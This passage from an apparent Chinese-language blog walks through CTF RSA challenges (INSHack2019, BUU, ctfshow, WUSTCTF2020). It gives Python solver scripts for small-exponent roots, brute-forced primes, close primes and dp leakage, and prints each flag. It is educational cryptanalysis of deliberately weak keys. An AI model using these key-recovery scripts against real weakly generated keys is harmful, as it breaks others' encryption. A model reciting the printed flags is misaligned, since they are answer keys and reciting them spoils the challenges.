punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    c <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">]</span>    c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    e <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    e <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token punctuation">,</span> e<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>    flag <span class="token operator">=</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""(mpz(30156321943599743278455918182580886589695285093075236154009535613), True)b'INSA&#123;(I)NSA_W0uld_bE_pr0uD&#125;'"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个m远小于n的情况下直接对c求e的次方根就有可能可以解出来这个m。</p><h4 id="INSHack2019-Yet-Another-RSA-Challenge-Part-1"><a href="#INSHack2019-Yet-Another-RSA-Challenge-Part-1" class="headerlink" title="[INSHack2019]Yet Another RSA Challenge - Part 1"></a>[INSHack2019]Yet Another RSA Challenge - Part 1</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""import subprocessp = subprocess.check_output('openssl prime -generate -bits 2048 -hex')q = subprocess.check_output('openssl prime -generate -bits 2048 -hex')flag = int('INSA&#123;REDACTED&#125;'.encode('hex'), 16)N = int(p,16) * int(q,16)print Nprint '0x'+p.replace('9F','FC')print pow(flag,65537,N)"""</span><span class="token comment"># FC可能是9F，也可能是FC，爆破</span><span class="token keyword">import</span> itertools<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>p <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>np <span class="token operator">=</span> p<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'FC'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>np<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 共4个FC</span>dic <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'FC'</span><span class="token punctuation">,</span> <span class="token string">'9F'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">getp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> dic<span class="token punctuation">:</span>        <span class="token keyword">for</span> b <span class="token keyword">in</span> dic<span class="token punctuation">:</span>            <span class="token keyword">for</span> c <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                <span class="token keyword">for</span> d <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                    p <span class="token operator">=</span> np<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> a <span class="token operator">+</span> np<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> b <span class="token operator">+</span> np<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> c <span class="token operator">+</span> np<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> d <span class="token operator">+</span> np<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>                    p <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                    q <span class="token operator">=</span> n <span class="token operator">//</span> p                    <span class="token keyword">if</span> n <span class="token operator">==</span> p <span class="token operator">*</span> q<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"I have got p:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>p<span class="token punctuation">&#125;</span></span><span class="token string">、q:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>q<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                        <span class="token keyword">return</span> p<span class="token punctuation">,</span> qp<span class="token punctuation">,</span> q <span class="token operator">=</span> getp<span class="token punctuation">(</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token number">0x10001</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'INSA&#123;I_w1ll_us3_OTp_n3xT_T1M3&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>部分替换，爆破一下即可得到p。ps：用在线的也行，但是考虑到线下没网，所以尽量使用脚本。</p><h3 id="一般rsa"><a href="#一般rsa" class="headerlink" title="一般rsa"></a>一般rsa</h3><h4 id="buu、rsa"><a href="#buu、rsa" class="headerlink" title="buu、rsa"></a>buu、rsa</h4><p>题目描述：ras是一个非常神秘的算法，那么它神秘在哪里 请少侠自己摸索！ 注意：得到的 flag 请包上 flag{} 提交</p><p>文件给出的是</p><p><img src="/2021/05/28/CTF/image-20210531094155238.png" alt="这两个文件"></p><p>？？？发生什么事了，这不是密码学的前几天做过的那个啥啥啥嘛。</p><p><a href="http://tool.chacuo.net/cryptrsakeyparse">在线rsa公钥文件分解</a></p><p><a href="https://www.ssleye.com/pub_asysi.html">在线rsa公钥文件分解2（n分解为十进制）</a></p><p>直接把pub.key文件内的内容复制到上面的网站内分解一下p、q、n。</p><p><img src="/2021/05/28/CTF/image-20210531094620593.png" alt="获得模数与指数"></p><p>再在线分解一下大整数n得下面的一些数据</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">e &#x3D; 65537n &#x3D; 86934482296048119190666062003494800588905656017203025617216654058378322103517p &#x3D; 285960468890451637935629440372639283459q &#x3D; 304008741604601924494328155975272418463<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>写下面得python脚本解密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> rsa<span class="token keyword">import</span> gmpy2e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span>p <span class="token operator">=</span> <span class="token number">285960468890451637935629440372639283459</span>q <span class="token operator">=</span> <span class="token number">304008741604601924494328155975272418463</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PrivateKey<span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.enc'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> encflag<span class="token punctuation">:</span>    flag <span class="token operator">=</span> rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>encflag<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'flag&#123;decrypt_256&#125;\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ctfshow、crypto4"><a href="#ctfshow、crypto4" class="headerlink" title="ctfshow、crypto4"></a>ctfshow、crypto4</h4><p><strong>TAG: 简单求d</strong></p><p>给出条件如下</p><pre class="line-numbers language-none"><code class="language-none">p&#x3D;447685307q&#x3D;2037e&#x3D;17求d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写简单脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2p<span class="token operator">=</span><span class="token number">447685307</span>q<span class="token operator">=</span><span class="token number">2037</span>e<span class="token operator">=</span><span class="token number">17</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token comment"># 53616899001</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ctfshow、crypto4-1"><a href="#ctfshow、crypto4-1" class="headerlink" title="ctfshow、crypto4"></a>ctfshow、crypto4</h4><p><strong>TAG: 简单求m</strong></p><p>给出条件如下</p><pre class="line-numbers language-none"><code class="language-none">p&#x3D;447685307q&#x3D;2037e&#x3D;17c&#x3D;704796792<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>继续把上面的脚本完善一下就ok了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesp<span class="token operator">=</span><span class="token number">447685307</span>q<span class="token operator">=</span><span class="token number">2037</span>e<span class="token operator">=</span><span class="token number">17</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token comment"># 53616899001</span>c<span class="token operator">=</span><span class="token number">704796792</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qm <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token comment"># 904332399012</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 看来m并不是任何有意义的信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ctfshow、babyrsa"><a href="#ctfshow、babyrsa" class="headerlink" title="ctfshow、babyrsa"></a>ctfshow、babyrsa</h4><p><strong>TAG: 有p、q、e、c</strong></p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 65537p &#x3D; 104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179q &#x3D; 140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501c &#x3D; 4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>直接解</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytese <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179</span>q <span class="token operator">=</span> <span class="token number">140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501</span>c <span class="token operator">=</span> <span class="token number">4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qm <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;b4by_R5A&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ctfshow、babyrsa-1"><a href="#ctfshow、babyrsa-1" class="headerlink" title="ctfshow、babyrsa"></a>ctfshow、babyrsa</h4><p><strong>TAG: 有n、e、c</strong></p><p>先分解大整数n</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 65537n &#x3D; 1455925529734358105461406532259911790807347616464991065301847c &#x3D; 69380371057914246192606760686152233225659503366319332065009p &#x3D; 1201147059438530786835365194567<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytese <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">1455925529734358105461406532259911790807347616464991065301847</span>c <span class="token operator">=</span> <span class="token number">69380371057914246192606760686152233225659503366319332065009</span>p <span class="token operator">=</span> <span class="token number">1201147059438530786835365194567</span>q <span class="token operator">=</span> n <span class="token operator">//</span> pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;fact0r_sma11_N&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ctfshow、easyrsa2"><a href="#ctfshow、easyrsa2" class="headerlink" title="ctfshow、easyrsa2"></a>ctfshow、easyrsa2</h4><p><strong>TAG: 简单rsa</strong></p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 65537n &#x3D; 23686563925537577753047229040754282953352221724154495390687358877775380147605152455537988563490716943872517593212858326146811511103311865753018329109314623702207073882884251372553225986112006827111351501044972239272200616871716325265416115038890805114829315111950319183189591283821793237999044427887934536835813526748759612963103377803089900662509399569819785571492828112437312659229879806168758843603248823629821851053775458651933952183988482163950039248487270453888288427540305542824179951734412044985364866532124803746008139763081886781361488304666575456680411806505094963425401175510416864929601220556158569443747c &#x3D; 1627484142237897613944607828268981193911417408064824540711945192035649088104133038147400224070588410335190662682231189997580084680424209495303078061205122848904648319219646588720994019249279863462981015329483724747823991513714172478886306703290044871781158393304147301058706003793357846922086994952763485999282741595204008663847963539422096343391464527068599046946279309037212859931303335507455146001390326550668531665493245293839009832468668390820282664984066399051403227990068032226382222173478078505888238749583237980643698405005689247922901342204142833875409505180847943212126302482358445768662608278731750064815p &#x3D; 149751992878258417619955913803349588855907883795437275015624379454686823076475394292360761230383018058515386650339444595246524276345367505681814522035068825010950620582957883108812048922184886717309007677307472277565963907119402324227023856527902596769190955018836727291623263893333224367236239361837356140243-------------------------------------------------------------------------------------------------------------------e &#x3D; 65537n &#x3D; 22257605320525584078180889073523223973924192984353847137164605186956629675938929585386392327672065524338176402496414014083816446508860530887742583338880317478862512306633061601510404960095143941320847160562050524072860211772522478494742213643890027443992183362678970426046765630946644339093149139143388752794932806956589884503569175226850419271095336798456238899009883100793515744579945854481430194879360765346236418019384644095257242811629393164402498261066077339304875212250897918420427814000142751282805980632089867108525335488018940091698609890995252413007073725850396076272027183422297684667565712022199054289711c &#x3D; 2742600695441836559469553702831098375948641915409106976157840377978123912007398753623461112659796209918866985480471911393362797753624479537646802510420415039461832118018849030580675249817576926858363541683135777239322002741820145944286109172066259843766755795255913189902403644721138554935991439893850589677849639263080528599197595705927535430942463184891689410078059090474682694886420022230657661157993875931600932763824618773420077273617106297660195179922018875399174346863404710420166497017196424586116535915712965147141775026549870636328195690774259990189286665844641289108474834973710730426105047318959307995062p &#x3D; 148629777091647844246796264243541316933219734934432518942362371402056651201924476622085034421034723763998765357939318936167411912678961237019833852640423223833408458277374583926678987391357358691970765804588287101985728943684133878401175077872266031328212861797034052872034250560671628711714389757777347537077<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个估计他的意思是让手搓的，但是在线的可以出来就也不手搓了。</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;m0_bv_hv_sv&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上下两部分接出来的flag是相同的，更加确定了这个应该是让用脚本自己推出来m的，但是我懒得推，估计是与e有关的。</p><h4 id="ctfshow、easyrsa6"><a href="#ctfshow、easyrsa6" class="headerlink" title="ctfshow、easyrsa6"></a>ctfshow、easyrsa6</h4><p><strong>TAG: p、q相距很近</strong></p><p>看脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token punctuation">,</span>libnum<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token keyword">from</span> secret <span class="token keyword">import</span> flage <span class="token operator">=</span> <span class="token number">0x10001</span>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token comment"># 上面p和q的生成过程说明p和q的相差应该时不大的</span>n <span class="token operator">=</span> p <span class="token operator">*</span> q<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n ="</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span>m <span class="token operator">=</span> libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c ="</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># n = 26737417831000820542131903300607349805884383394154602685589253691058592906354935906805134188533804962897170211026684453428204518730064406526279112572388086653330354347467824800159214965211971007509161988095657918569122896402683130342348264873834798355125176339737540844380018932257326719850776549178097196650971801959829891897782953799819540258181186971887122329746532348310216818846497644520553218363336194855498009339838369114649453618101321999347367800581959933596734457081762378746706371599215668686459906553007018812297658015353803626409606707460210905216362646940355737679889912399014237502529373804288304270563</span><span class="token comment"># c = 18343406988553647441155363755415469675162952205929092244387144604220598930987120971635625205531679665588524624774972379282080365368504475385813836796957675346369136362299791881988434459126442243685599469468046961707420163849755187402196540739689823324440860766040276525600017446640429559755587590377841083082073283783044180553080312093936655426279610008234238497453986740658015049273023492032325305925499263982266317509342604959809805578180715819784421086649380350482836529047761222588878122181300629226379468397199620669975860711741390226214613560571952382040172091951384219283820044879575505273602318856695503917257</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个时候通过yafu还有那个在线的网站factordb.com应该都是可以解出p和q的</p><p>直接在线</p><pre class="line-numbers language-none"><code class="language-none">p &#x3D;163515803000813412334620775647541652549604895368507102613553057136855632963322853570924931001138446030409251690646645635800254129997200577719209532684847732809399187385176309169421205833279943214621695444496660249881675974141488357432373412184140130503562295159152949524373214358417567189638680209172147385801<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;p&amp;q_4re_t00_c1o5ed&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="dp泄露"><a href="#dp泄露" class="headerlink" title="dp泄露"></a>dp泄露</h3><blockquote><p>dp的存在是为了在计算之中更加方便，取dp的公式为<code>dp = d % (p-1)</code></p><p>可以使用下面的脚本碰撞得出d</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getd</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>dp <span class="token operator">*</span> e <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token punctuation">(</span>dp <span class="token operator">*</span> e <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> i <span class="token operator">+</span> <span class="token number">1</span>            y <span class="token operator">=</span> n <span class="token operator">%</span> x            <span class="token keyword">if</span> y <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                p <span class="token operator">=</span> x                <span class="token keyword">break</span>    q <span class="token operator">=</span> n <span class="token operator">//</span> p    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span> <span class="token operator">%</span> phi    <span class="token keyword">return</span> d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dp换成dq亦可以此法获得d。</p></blockquote><h4 id="WUSTCTF2020-dp-leaking-1s-very-d-angerous"><a href="#WUSTCTF2020-dp-leaking-1s-very-d-angerous" class="headerlink" title="[WUSTCTF2020]dp_leaking_1s_very_d@angerous"></a>[WUSTCTF2020]dp_leaking_1s_very_d@angerous</h4><p>给出数据为</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 65537n &#x3D; 156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847c &#x3D; 108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869dp &#x3D; 